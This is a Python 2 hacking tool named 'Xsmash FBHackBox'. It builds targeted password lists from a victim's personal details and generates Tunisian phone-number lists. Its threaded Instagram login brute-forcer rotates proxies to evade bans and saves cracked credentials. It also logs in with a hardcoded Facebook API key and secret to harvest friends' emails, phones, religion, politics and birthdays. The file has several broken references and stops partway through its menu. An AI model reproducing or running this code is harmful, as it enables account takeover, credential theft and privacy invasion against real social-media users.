#!/usr/bin/env python
# encoding: utf-8
#######  Ova  #######
#read trikz.txt (link ..)
#<raw.github.com/m4rktn/master/xsmash/trikz.txt>
#[!] If You got Bugs Or You have Ideas Call Me [!]
#######    Xsmash ~ Priv8 FBHackBox ~   #######
####### Hentai Started..Thnx 4 Watching #######
'''

   ███╗   ███╗██╗  ██╗██████╗ ██╗  ██╗
   ████╗ ████║██║  ██║██╔══██╗██║ ██╔╝
   ██╔████╔██║███████║██████╔╝█████╔╝ 
   ██║╚██╔╝██║╚════██║██╔══██╗██╔═██╗ 
   ██║ ╚═╝ ██║     ██║██║  ██║██║  ██╗
   ╚═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝*W4lk3r*
   (C)opyright > Github.com/M4rktn
'''
import string
import random
import os,re,sys,json,hashlib,time,os.path
from platform import system
from random import choice
#######  Some Colors   #######
la7mar  = '\033[91m'
lazra9  = '\033[94m'
la5dhar = '\033[92m'
movv    = '\033[95m'
lasfar  = '\033[93m'
ramadi  = '\033[90m'
blid    = '\033[1m'
star    = '\033[4m'
bigas   = '\033[07m'
bigbbs  = '\033[27m'
hell    = '\033[05m'
saker   = '\033[25m'
labyadh = '\033[00m'
cyan    = '\033[0;96m'

#######  Import sauce  #######
try: 
 import requests
except:
  print"%s[%s?%s] Installing requests Module%s"%(la7mar,la5dhar,la7mar,labyadh)
  if os.name=='nt':
    try:
      os.system('cd:\Python27\Scripts\pip2.exe install requests')
    except:
      print "Install Python-Pip Sir"
      raw_input('')
  else:
    try:
      os.system('pip2 install requests')
    except:
      print "%sTry To Install pip2 For Your Devices And Try 'root@usr:~$ pip2 install requests'%s"%(la7mar,labyadh)
####### Clear Terminal/cmd #######
def clear():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')
#For update Reason ..plz Dont change it
update_jogan="ver0x01-11" 
try:
 zz=requests.get('https://raw.githubusercontent.com/m4rktn/xsmash/master/xsmash.py')
 if update_jogan not in zz.text.encode('utf-8'):
  print "{y}Notification {r}! {y}New Version Of {re}X{g}smash \n{y}Do You Want To Get Update RightNow {r}?? ({y}Y{r}/{y}n{r})\033[00m".format(r=la7mar,g=la5dhar,y=la7mar,re=ramadi)
  tfq=raw_input("%ssmash> %s"%(ramadi,lazra9))
  if tfq.upper() in momoChan:
   if os.name!='nt':
     os.system('wget https://raw.githubusercontent.com/m4rktn/xsmash/master/xsmash.py -O xsmash.py')
   else:
      print "%s#> Install This Tool Wa7dk -_- \nlink> https://github.com/m4rktn/xsmash"%la7mar
except:
  pass
#
momoChan=['Y','YES','O','OUI','SI','AY','EY','JA','HAY'] #All Yes 's Team 
#######      LogoS        #######
logooo=""" {g} I Wanna Be Hero n° 1{y} Allmighto {r}!!
                  ~~{g}Medoriya Sama{r}~~
 {y} Ultra Smash{r} !{g} 30%
 {y} Ultra Smash{r} !{g} 48%
 {y} Ultra Smash{r} !{g} 53%
 {y} Ultra Smash{r} !{g} 69%
 {y} Ultra Smash{r} !{g} 97%
 {y} Ultra ...{r} 99.9% ! Failed ...{y} P{p}o{b}ww{r}er !!{bl}
""".format(r=la7mar,y=lasfar,g=la5dhar,p=labyadh,b=lazra9,bl=blid),"""
 {r} __   __      _____                 _____ _   _ 
 {r} \ \ / /     /  ___|               /  ___| | | |
 {g}  \ V /______\ `--. _ __ ___   __ _\ `--.| |_| |
 {g}  /   \______|`--. \ '_ ` _ \ / _` |`--. \  _  | 
 {r} / /^\ \     /\__/ / | | | | | (_| /\__/ / | | |
 {r} \/   \/     \____/|_| |_| |_|\__,_\____/\_| |_/""".format(r=la7mar,g=la5dhar),"""
   {g}/{r}$$   {g}/{r}$$        {g} /{r}$$$$$$                          {g}{g} /{r}$$$$$$ {g} /{r}$$  {g} /{r}$$
  {g}| {r}$$ {g} / {r}$$     {g}   /{r}$${g}__  {r}$$                       {g}  /{r}$${g}__  {r}$${g}| {r}$$  {g}| {r}$$
  {g}|  {r}$${g}/ {r}$$/      {g} | {r}$$  {g}\__/ /{r}$$$$$$/{r}$$$$   {g}/{r}$$$$$${g} | {r}$$ {g} \__/| {r}$$ {g} | {r}$$
  {g} \  {r}$$$${g}/ /{r}$$$$$${g}|  {r}$$$$$$ {g}| {r}$$_  {r}$$_  {r}$$ {g}|____  {r}$${g}|  {r}$$$$$${g} | {r}$$$$$$$$
  {g}  >{r}$$  {r}$${g}|______/ \____  {r}$${g}| {r}$${g} \ {r}$${g} \ {r}$$  {g}/{r}$$$$$$$ {g}\____  {r}$${g}| {r}$${g}__  {r}$$
  {g} /{r}$${g}/\  {r}$$  {g}      /{r}$$  {g}\ {r}$${g}| {r}$$ {g}| {r}$$ {g}|{r} $$ {g}/{r}$${g}__  {r}$$ {g}/{r}$$ {g} \ {r}$${g}| {r}$$  {g}| {r}$$
  {g}| {r}$$  \ {r}$$     {g}  |  {r}$$$$$${g}/| {r}$$ {g}| {r}$$ {g}| {r}$${g}|  {r}$$$$$$${g}|  {r}$$$$$${g}/| {r}$$  {g}| {r}$$
  {g}|__/  |__/        \______/ |__/ |__/ |__/ \_______/ \______/ |__/  |__/""".format(r=la7mar,g=la5dhar),"""
  {r}   )       (                  (        )  
  ( /(       )\ )               )\ )  ( /(  
  )\())     (()/(    )       ) (()/(  )\()) 
  ((_)\  {g}___ {r} /(_))  (     ( /(  /(_))((_)\  
  {g}__{r}(({g}_{r}){g}|___|{r}({g}_{r}))    )\  ' )({g}_{r}))({g}_{r}))   {g}_{r}(({g}_{r}) {g}
  \ \/ /     / __| _((_)) ((_)_ / __| | || | 
   >  <      \__ \| '  \()/ _` |\__ \ | __ | 
  /_/\_\     |___/|_|_|_| \__,_||___/ |_||_| 
                                           """.format(r=la7mar,g=la5dhar)
logon="%s\033[93m%s\n   %s%sX%s-%ssmash\033[92mV1\033[91m.\033[92m0%s%s | %s%sPriv8%s \033[93mFBHackBox %s%s|%s%s Th3%sCod3r>%s M4rkW4lk3r%s"%(blid,random.choice(logooo),hell,la5dhar,lazra9,la7mar,saker,lazra9,hell,lasfar,la5dhar,saker,lazra9,hell,la7mar,la5dhar,lasfar,saker)
####### Ohayo Sensei ^.^ #######
def allmight():
  print"""%s
  [%s1%s]   Random Numbers
  [%s2%s]   Numbers Ranger
  [%s666%s] Back """%(la5dhar,lazra9,la5dhar,lazra9,la5dhar,lazra9,la5dhar)
  noob=raw_input("%ssmash> %s"%(ramadi,lazra9))
  if noob =='1':
   nb=0
   xtn=int(raw_input("%s[%s/%s] How Mush %s??\n%ssmash> %s"%(la7mar,la5dhar,la7mar,la5dhar,ramadi,lazra9)))
   print"%s[%s/%s] Length %s!%s"%(la7mar,la5dhar,la7mar,la5dhar,la7mar)
   ztn=int(raw_input("%ssmash> %s"%(ramadi,lazra9)))
   try :
    for az in range(xtn) :
      urname = string.digits
      urname1 = ''.join(choice(urname) for _ in range(ztn))
      save = open("xrzlts/passran.txt", 'a')
      save.write(urname1 + '\n')
      nb=nb+1
    print" %s[✔] %s Saved In xrzlts/passran.txt !"%(la5dhar,nb+1)
   except:
        pass
  elif noob =='2':
    nb=0
    startfrom=raw_input("%s[%s/%s] Start From ! %s[defaut:1]\n%ssmash> %s"%(la7mar,la5dhar,la7mar,la5dhar,ramadi,lazra9))
    if len(str(startfrom))==0:
      startfrom=1
    endto=raw_input("%s[%s/%s] End To %s?\n%ssmash> %s"%(la7mar,la5dhar,la7mar,la5dhar,ramadi,lazra9))
    for ii in range(int(startfrom),int(endto),1):
      zz=open('xrzlts/numpass.txt','a')
      zz.write(str(ii)+'\n')
      nb=nb+1
    print" %s[✔] %s Number Saved In xrzlts/numpass.txt !"%(la5dhar,nb+1)
  elif noob =='666': 
   bokunohero() 
  else:
    exit()
def medoria():
 print """%s
            ▄▄▄▄▄▄• ▄▌ ▐ ▄ ▪  .▄▄ · ▪   ▄▄▄· 
            •██  █▪██▌•█▌▐███ ▐█ ▀. ██ ▐█ ▀█ 
             ▐█.▪█▌▐█▌▐█▐▐▌▐█·▄▀▀▀█▄▐█·▄█▀▀█ 
             ▐█▌·▐█▄█▌██▐█▌▐█▌▐█▄▪▐█▐█▌▐█ ▪▐▌
             ▀▀▀  ▀▀▀ ▀▀ █▪▀▀▀ ▀▀▀▀ ▀▀▀ ▀  ▀%s NBranger %sv1 
 """ %(la5dhar,lazra9,lasfar)
 print """%s
      [%s1%s] Orange 
      [%s2%s] Telecom
      [%s3%s] Ooredoo
      [%s666%s] Back
 """%(la7mar,lazra9,la7mar,lazra9,la7mar,lazra9,la7mar,lazra9,la7mar)
 ztn = raw_input("%ssmash> %s"%(ramadi,lazra9))
 if ztn =='1':
  xtn = raw_input("%s[%s/%s] How Much U need ? > %s"%(la7mar,la5dhar,la7mar,lazra9))
  try :
   for az in range(int(xtn)) :
    tn = string.digits
    tn0 = ''.join(choice(tn) for _ in range(7))
    fade= '5'+tn0 
    waw = open("xrzlts/tnorang.txt", 'a')
    waw.write(fade+ '\n')
   print "%s[✔] saved in xrzlts/tnorang.txt ! %s"%(la5dhar,labyadh)

  except : 
       pass
 elif ztn =='2':
  xtn = raw_input("%s[%s/%s] How Much U need ? > %s"%(la7mar,la5dhar,la7mar,lazra9))
  try :
   for az in range(int(xtn)) :
    tn = string.digits
    tn0 = ''.join(choice(tn) for _ in range(7))
    fade= '9'+tn0 
    waw = open("xrzlts/tntt.txt", 'a')
    waw.write(fade+ '\n') 
   print "%s[✔] saved in xrzlts/tntt.txt %s"%(la5dhar,labyadh)
  except :
       pass
 elif ztn =='3':
  xtn = raw_input("%s[%s/%s] How Much U need ? > %s"%(la7mar,la5dhar,la7mar,lazra9))
  try :
   for az in range(int(xtn)) :
    tn = string.digits
    tn0 = ''.join(choice(tn) for _ in range(7))
    fade='2'+tn0 
    waw = open("xrzlts/tnoored.txt", 'a')
    waw.write(fade+ '\n')
   print" %s[✔] saved in xrzlts/tnoored.txt %s"%(la5dhar,labyadh)
  except : 
       pass
 elif ztn=='666':
  bokunohero()
def beloumi():
 try:
  with open('xrzlts/TNPhones.txt','a') as tounsi:
    if os.path.isfile('xrzlts/tnoored.txt'):
     tn1=open('xrzlts/tnoored.txt').read().splitlines()
    if os.path.isfile('xrzlts/tntt.txt'):
     tn2=open('xrzlts/tntt.txt').read().splitlines()
    if os.path.isfile('xrzlts/tnorang.txt'):
     tn3=open('xrzlts/tnorang.txt').read().splitlines()
    for i in tn1:
      tounsi.write(str(i)+'\n')
    for i in tn2:
      tounsi.write(str(i)+'\n')
    for i in tn3:
      tounsi.write(str(i)+'\n')
  print "done" 
 except:
  medoria()
def toro():
####### Work With Info #######
 hikir=['','2004','2005','2006','2007','2008','2009','2010','2011','2012','2013','2014','2015','2016','2017','2018','2019','qwerty','azerty','azerty123','azerty1234','12','123','1234','12345','123456','1234567','12345678','123456789''1234567890','987654321','321','1111','0000','01','0123','01234','012345','0123456','01234567','012345678','0123456789','11','22','33','44','55','66','77','88','99','00']
 snin=['0','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 ## I like This range okk ^^ 
 print """\n
    {r}<===========================>
    {r}<=>   {g}Valid FBPassMaker   {r}<=>
    {r}<=>       {g}By {re}W4lk3r       {r}<=>
    {r}<===========================>  
 """.format(r=la7mar,g=la5dhar,re=ramadi)
 zack =raw_input("%sEnter UserName > %s"%(la7mar,lazra9))
 while len(zack)==0 or zack[0].isdigit() :
  print "%s[%s!%s] Invalid Name ..Please Try"%(la7mar,la5dhar,la7mar)
  zack =raw_input("%sEnter UserName > %s"%(la7mar,lazra9))
 mayar =raw_input("%sEnter Nickname > %s"%(la7mar,lazra9))
 zack2=raw_input("%sEnter PhoneNum > %s"%(la7mar,lazra9))
 while not zack2.isdigit() or len(zack2)<8:
    print "%s[%s!%s] Incorrect Number ..Please Try"%(la7mar,la5dhar,la7mar)
    zack2=raw_input("%sEnter PhoneNum > %s"%(la7mar,lazra9))
 print "%sHave U The Date ? [Y(Yes)/N(No)]"%la7mar
 gaza=raw_input("%ssmash> %s"%(ramadi,lazra9))
 gaza =gaza.upper()
 if gaza in momoChan:
  daty=raw_input("%s[%s*%s] Enter year [e.g : 1999] : %s"%(la7mar,la5dhar,la7mar,lazra9))
  while not daty.isdigit():
    print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
    daty=raw_input("%s[%s*%s] Enter year [e.g : 1999] : %s"%(la7mar,la5dhar,la7mar,lazra9))
  while int(daty) not in range(1941,2003) :
   print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
   daty=raw_input("%s[%s*%s] Enter year [e.g : 1999] : %s"%(la7mar,la5dhar,la7mar,lazra9))
  datm=raw_input("%s[%s*%s] Mounth[mm] : %s"%(la7mar,la5dhar,la7mar,lazra9))
  while not datm.isdigit():
    print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
    datm=raw_input("%s[%s*%s] Mounth[mm] : %s"%(la7mar,la5dhar,la7mar,lazra9))
  while int(datm) not in range(1,12) :
   print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
   datm=raw_input("%s[%s*%s] Mounth[mm] : %s"%(la7mar,la5dhar,la7mar,lazra9))
  datd=raw_input("%s[%s*%s] Day[dd] : %s"%(la7mar,la5dhar,la7mar,lazra9))
  while not datd.isdigit():
    print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
    datd=raw_input("%s[%s*%s] Day[dd] : %s"%(la7mar,la5dhar,la7mar,lazra9))
  while int(datd) not in range(1,31) :
   print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
   datd=raw_input("%s[%s*%s] Day[dd] : %s"%(la7mar,la5dhar,la7mar,lazra9))
 else:
      pass
 print "%sEnter Name of Gf/Bf/Company/Mother/hobbie/father/sister/..."%la7mar
 zack3=raw_input("%ssmash> %s"%(ramadi,lazra9))
 ille=raw_input(" %s[%s+%s]Do You Need To Add Symboles ? [e.g : !#$^ ]\n%ssmash> %s"%(la7mar,la5dhar,la7mar,ramadi,lazra9))
 ille= ille.upper()
 try:
  for x in hikir:
    side = zack + x
    darkside=open('xrzlts/passwd.txt','a')
    darkside.write(side+'\n')
  for y in hikir:
    side = zack3 + y
    darkside=open('xrzlts/passwd.txt','a')
    darkside.write(side+'\n') 
  for zz in hikir:
    side = zack+'@'+zack+zz +'\n'+'@'+zz+zack+'\n'+zz+'@'+zack+'\n'+zack+zz+mayar+'\n'+zack+mayar+zz+'\n'+zack2+zz
    darkside=open('xrzlts/passwd.txt','a')
    darkside.write(side+'\n')    
  for xx in snin:
    side = zack+xx
    darkside=open('xrzlts/passwd.txt','a')
    darkside.write(side+'\n')
  for zx in hikir :
    side1 = zack+' '+zx
    side2 = zack+' '+zx+mayar
    darkside=open('xrzlts/passwd.txt','a')
    darkside.write(side+'\n')    
 except:
   print '%s❌ Opps .. !!'%la7mar
   exit()
 dark = zack2+zack
 dark2= zack+zack2+'\n'+zack+mayar+'\n'+mayar+zack2+'\n'+zack+zack+'\n'+zack+zack+zack2+'\n'+zack+'@'+zack+'\n'+zack+'@'+zack2+'\n'+zack+' '+mayar+'\n'+mayar+' '+zack+'\n'+zack3+' '+zack+'\n'+zack+' '+zack2+'\n'+zack2+' '+zack
 if gaza in ['Y','YES','SI','OUI','EY','AY']:
  daty1=daty[2:]
  dark3= zack+daty+datm+datd+'\n'+zack+daty+datm+'\n'+zack+daty1+'\n'+zack+daty+'\n'+mayar+daty1+'\n'+zack+'@'+daty+'\n'+zack+'@'+daty1+zack+'\n'+zack+daty+mayar+'\n'+zack+mayar+daty+'\n'+zack+zack+daty+'\n'+zack+daty1+mayar+'\n'+zack+mayar+daty1+'\n'+zack+zack+daty1
  dark6= dark+('\n')+dark2+('\n')+dark3+('\n')
  darkside=open('xrzlts/passwd.txt','a')
  darkside.write(dark6+'\n')
 else :
  darkside=open('xrzlts/passwd.txt','a')
  darkside.write(zack2+'\n')
 if ille in momoChan:
  for xy in range(500):
    side2 = '!@#$%^&*()_+<>.'
    side1 = ''.join(choice(side2) for _ in range(3))
    side3 = ''.join(choice(side2) for _ in range(2))
    side4 = ''.join(choice(side2) for _ in range(4))
    side  = zack+side1+'\n'+zack+side3+'\n'+zack+side4
    darkside=open('xrzlts/passwd.txt','a')
    darkside.write(side+'\n')
 else:
    pass
 lines = 0
 with open('xrzlts/passwd.txt') as jogan:
    for line in jogan:
        lines = lines + 1
 lines = lines + 1
 darkside.close()
 print"%s[✔] Ur Results Saved In xrzlts/passwd.txt ! [ %s%s%s Passwords ]"%(la5dhar,lazra9,lines,la5dhar)
 nigga = raw_input("%sBrute Or Return To Menu Or quit [B/r/q]\n %ssmash> %s"%(la7mar,ramadi,lazra9)).upper()
 if nigga =='B':
  ### Make User's ID in text ###
  darkweb=raw_input('ID : ')
  deepweb=open('xrzlts/user.txt','w')
  deepweb.write(darkweb)
  ### Make A combo ###
  zack = open('xrzlts/user.txt','r').read().splitlines()
  zack2 = open('xrzlts/passwd.txt','r').read().splitlines()
  for z in zack:
   for y in zack2:
    zz  = z+(':')+y
    zz0=open('xrzlts/combo.txt','a')
    zz0.write(mark+'\n')
  ### Back To Hack xD ###
  print "Back To Menu And Put number 5 Or 6 "
  raw_input('<x>Press Enter Or Any Key To Go<x>')
  clear()
  bokunohero()
 elif nigga =='R':
  bokunohero()
 else:
  exit()
############################
class InstaBrute(object):
  ## This Pizza By 04x - Thnx Dude Yummy ##
    def __init__(self):
        clear()
        print logon
        try: 
         Combolist=open('xrzlts/combo.txt', 'r').read().splitlines()
         print ('%s [✔] xrzlts/combo.txt .. Founded !'%(la5dhar))
        except:
          try:
            Combolist=open('combo.txt', 'r').read().splitlines()
            print ('%s [✔] combo.txt .. Founded !'%(la5dhar))
          except:
            print "%s❌ ERROR ! Please Make a combo list  "%la7mar
        if os.path.isfile('proxy.txt'):
         self.proxylist = list(open('proxy.txt').read().splitlines())
         print ('%s[✔] proxy.txt .. Founded !'%la5dhar)
        else:
            print ('%s❌ proxy.txt .. Not Found !'%la7mar)
            exit()
        thread = []
        self.putyourhend = 0
        for combo in Combolist:
            if self.putyourhend >= len(self.proxylist):
                self.putyourhend = 0
            proxy = self.Generate_Proxy(self.putyourhend)
            self.putyourhend = self.putyourhend + 1
            user = combo.split(':')[0]
            password = combo.split(':')[1]
            try:
                t = threading.Thread(target=self.Go, args=(user, password,
                                                           str(proxy)))
                t.start()
                thread.append(t)
                time.sleep(0.1)
            except:
                pass
        for j in thread:
            j.join()
        raw_input('Thnx Your Shooping .. Your Order Will Be Confirmed ^^[Press Anykey]')
    def Generate_Proxy(self, num):
        return self.proxylist[num]
    def Header(self, user, password, sess):
        headers = {
            'Host': 'www.instagram.com',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.instagram.com/',
            'X-CSRFToken': '',
            'X-Instagram-AJAX': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Length': '',
            'Cookie': '',
            'Connection': 'keep-alive'
        }
        datas = {'username': user, 'password': password}
        headers['X-CSRFToken'] = sess.cookies['csrftoken']
        headers['Cookie'] = "mid={}; csrftoken={}; ig_pr=1; ig_vw=1366".format(sess.cookies['mid'],
                                                                               sess.cookies['csrftoken'])
        lenthofData = str(19 + len(datas['username']) + len(datas['password']))
        headers['Content-Length'] = lenthofData
        return headers, datas
    def Go(self, user, password, proxyz):
        try:
            proxy = {'http': proxyz}
            Heddata = requests.get('https://www.instagram.com', proxies=proxy, timeout=10)
            sess = requests.session()
            headers, datas = self.Header(user, str(password), Heddata)
            GoT = sess.post('https://www.instagram.com/accounts/login/ajax/', headers=headers, data=datas,
                            proxies=proxy, timeout=10)
            if 'authenticated": true' in GoT.text:
                print'%sCracked !! Login:%s:%s | IP:%s'%(la5dhar,user,password,proxyz)
                with open('xrzlts/insta_rez.txt', 'a') as x:
                    x.write('---Cracked By M4rkWalker------\nLevel: Cracked\nProxy :'+proxyz +'\n'+user + ':' + password +'\n')
            elif 'Please wait a few minutes before you try again' in GoT.text:
                print"%sIP Banned...Changing..."%(ramadi)
                try:
                    self.putyourhend = self.putyourhend + 1
                    self.Go(user, password, str(self.proxylist[self.putyourhend]))
                except:
                    self.putyourhend = self.putyourhend - 2
                    self.Go(user, password, str(self.proxylist[self.putyourhend]))
            elif 'checkpoint_required' in GoT.text:
                print'%sCheckpoint !! Login:%s:%s | IP:%s'%(lasfar,user,password,proxyz)
                with open('xrzlts/insta_Checkpt.txt', 'a') as x:
                    x.write('---Cracked By M4rkWalker------\nLevel:Checkpoint\nProxy '+proxyz +'\n'+user + ':' + password +'\n')
            else:
                print"%s❌  Failed !! %s:%s"%(la7mar,user,password)
        except:
                print"%s❌  Failed !! %s:%s"%(la7mar,user,password)
####################
def uraraka():
  tebassa = string.ascii_letters + string.digits + '!@#$%^&*()_<>'
  tebayo  = ''.join(choice(tebassa) for n in range(10)) #change 10 for any number xD
  print "%s[%s+%s] Secure Password : %s%s"%(la7mar,la5dhar,la7mar,lazra9,tebayo)
####### Sauce : OSIF TOOL (Thnx DuDe) #######
def get():
   global a ,token,name
   os.system('clear')
   try:
    print '%s[%s✔%s] Sucess !! Your Token : %s%s'%(la7mar,la5dhar,la7mar,lazra9,token)
    tarrr=raw_input("%s[%s+%s] ID Of Your Nigga > %s"%(la7mar,la5dhar,la7mar,lazra9))
    if not tarrr.isdigit() == 1:
     url = 'https://www.facebook.com/%s'%tarrr
     lol1 = re.compile('"entity_id":"([0-9]+)"')
     page = requests.get(url)
     target1=str(lol1.findall(page.content))
     rr = "%s"%target1 #idk watis :/
     rr = rr.replace("['","")
     target = rr.replace("']","")
    else:
      target =tarrr
    try:
      r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
      a = json.loads(r.text)
    except:
      print '%s ❌ Something Wrong !!'%(la7mar)
    info(target)
   except KeyError:
    print '%s ❌ Something Wrong !!'%(la7mar)
    lvl69()
   except requests.exceptions.ConnectionError:
    print '%s ❌ Something Wrong !!'%(la7mar)
    lvl69()
def lvl69():
  global a ,token,name
  try:
    token = open('xrzlts/toka.log','r').read().splitlines()
    token=token[0]
  except:
    lvlgod()
  r = requests.get('https://graph.facebook.com/me?access_token=%s'%token)
  a = json.loads(r.text)
  name = str(a['name'])
  badel=raw_input("%sDo You Want To Continue With %s%s (Y/n)??"%(la5dhar,lazra9,name,la5dhar))
  if badel.upper() in momoChan:
    get()
  else:
    lvlgod()
  

def lvlgod():
  global token,name
  print '%s%s [%s 🛡 Please Log With Your Account 🛡 %s]%s'%(blid,lasfar,la5dhar,lasfar,la7mar);id = raw_input(' 📧 Email/username > %s'%lazra9);pwd = raw_input('%s 🗝  Password > %s'%(la7mar,lazra9));API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
  x = hashlib.new('md5')
  x.update(sig)

  data.update({'sig':x.hexdigest()})
  b = open('xrzlts/toka.log','w')
  r = requests.get('https://api.facebook.com/restserver.php',params=data)
  a = json.loads(r.text)
  try:
    b.write(a['access_token'])
  except:
    print '%s ❌ Something Wrong !!'%(la7mar)
    print "Check Your Login Or Network Bro "
  b.close()
  token =str(a['access_token'])
  r = requests.get('https://graph.facebook.com/me?access_token=%s'%token)
  a = json.loads(r.text)
  name = str(a['name'])
  get()

def info(target):
  global a , token
        
  for i in a['data']:

   if target in  i['name'] or target in i['id']:

    x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
    y = json.loads(x.text)


    print '     %s⚠⚠%s %sPrices Of Pizza%s %s⚠⚠%s'%(lasfar,la5dhar,bigas,bigbbs,lasfar,lazra9)

    try:
      print '%s[%s+%s] Id : %s'%(la7mar,la5dhar,la7mar,i['id'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] Username : %s'%(la7mar,la5dhar,la7mar,y['username'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] Email : %s'%(la7mar,la5dhar,la7mar,y['email'])
      zoo=open('xrzlts/%s_xemail.txt'%name,'a')
      zoo.write(y['email']+'\n')
    except KeyError:
      pass
    try:
      print '%s[%s+%s] Mobile Phone : %s'%(la7mar,la5dhar,la7mar,y['mobile_phone'])
      zoo=open('xrzlts/%s_xphone.txt'%name,'a')
      zoo.write(y['mobile_phone']+'\n')
    except KeyError:
      pass
    try:
      print '%s[%s+%s] Name : %s'%(la7mar,la5dhar,la7mar,y['name'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] First name : %s'%(la7mar,la5dhar,la7mar,y['first_name'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] Midle name : %s'%(la7mar,la5dhar,la7mar,y['middle_name'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] Last name : %s'%(la7mar,la5dhar,la7mar,y['last_name'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] Locale : %s'%(la7mar,la5dhar,la7mar,y['locale'].split('_')[0])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] location : %s'%(la7mar,la5dhar,la7mar,y['location']['name'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] hometown : %s'%(la7mar,la5dhar,la7mar,y['hometown']['name'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] gender : %s'%(la7mar,la5dhar,la7mar,y['gender'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] religion : %s'%(la7mar,la5dhar,la7mar,y['religion'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] relationship status : %s'%(la7mar,la5dhar,la7mar,y['relationship_status'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] political : %s'%(la7mar,la5dhar,la7mar,y['political'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] Work :'%(la7mar,la5dhar,la7mar)

      for i in y['work']:
        try:
          print '   %s[%s/%s] position : %s'%(la7mar,lasfar,la7mar,i['position']['name'])
        except KeyError:
          pass
        try:
          print '   %s[%s/%s] employer : %s'%(la7mar,la5dhar,la7mar,i['employer']['name'])
        except KeyError:
          pass
        try:
          if i['start_date'] == "0000-00":
            print '   %s[%s/%s] start date : ---'%(la7mar,la5dhar,la7mar)
          else:
            print '   %s[%s/%s] start date : %s'%(la7mar,la5dhar,la7mar,i['start_date'])
        except KeyError:
          pass
        try:
          if i['end_date'] == "0000-00":
            print '   %s[%s/%s] end date : ---'%(la7mar,la5dhar,la7mar)
          else:
            print '   %s[%s/%s] end date : %s'%(la7mar,la5dhar,la7mar,i['end_date'])
        except KeyError:
          pass
        try:
          print '   %s[%s+%s] location : %s'%(la7mar,la5dhar,la7mar,i['location']['name'])
        except KeyError:
          pass
        print ' '
    except KeyError:
      pass
    try:
      print '%s[%s+%s] Updated time : %s'%(la7mar,la5dhar,la7mar,y['updated_time'][:10]+' '+y['updated_time'][11:19])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] Languages : '%(la7mar,la5dhar,la7mar)
      for i in y['languages']:
        try:
          print '%s ~  %s'%(la7mar,i['name'])
        except KeyError:
          pass
    except KeyError:
      pass
    try:
      print '%s[%s+%s] Bio : %s'%(la7mar,la5dhar,la7mar,y['bio'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] quotes : %s'%(la7mar,la5dhar,la7mar,y['quotes'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] birthday : %s'%(la7mar,la5dhar,la7mar,y['birthday'].replace('/','-'))
    except KeyError:
      pass
    try:
      print '%s[%s+%s] link : %s'%(la7mar,la5dhar,la7mar,y['link'])
    except KeyError:
      pass
    try:
      print '%s[%s+%s] Favourite teams : '%(la7mar,la5dhar,la7mar)
      for i in y['favorite_teams']:
        try:
          print ' %s~  %s'%(la7mar,i['name'])
        except KeyError:
          pass
    except KeyError:
      pass
    try:
      print '%s[%s+%s] School : '%(la7mar,la5dhar,la7mar)
      for i in y['education']:
        try:
          print ' %s~  %s'%(la7mar,i['school']['name'])
        except KeyError:
          pass
    except KeyError:
      pass
   else:
    print '%s ❌ Something Wrong !!'%(la7mar)
  print "%s[%s✔%s] Thnx For Watching Nsibti La3ziza xD%s"%(la7mar,la5dhar,la7mar,lazra9)
  raw_input("press any key to Back To Menu ...")
  clear()
  bokunohero()
####################
def bokunohero():
####### logo ####### 
 print logon
####### Menu #######
 print """ 
  {r}<{y}------------------------------------------------------{r}>
  {r}[{y}!{r}]{y}  Im Not Responsible For Any activity From This Tool 
  {r}[{g}0{r}]{y}  Get Info From Facebook(Graph.Fb)
  {r}[{g}1{r}]{y}  Passwords With Info 
  {r}[{g}2{r}]{y}  Passwords With Numbers
  {r}[{g}3{r}]{y}  Passwords With NumberPhone(Only Tunisia) 
  {r}[{g}4{r}]{y}  Get Some Passlists
  {r}[{g}5{r}]{y}  Brute Facebook
